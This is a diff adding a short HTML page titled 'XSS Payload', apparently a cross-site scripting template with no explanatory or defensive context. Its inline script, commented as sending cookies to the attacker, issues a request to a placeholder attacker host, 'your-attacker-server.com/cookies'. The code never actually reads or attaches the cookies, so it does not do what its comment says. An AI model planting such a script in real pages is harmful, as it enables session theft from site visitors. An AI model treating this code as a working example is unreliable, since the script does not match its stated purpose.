@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>XSS Payload</title>
+</head>
+
+<body>
+    <div>
+        <h1>Welcome to the XSS Payload</h1>
+        <script>
+            // Send the cookies to the attacker's server
+            var req = new XMLHttpRequest();
+            req.open('GET', 'http://your-attacker-server.com/cookies');
+            req.send();
+        </script>
+    </div>
+</body>
+
+</html>
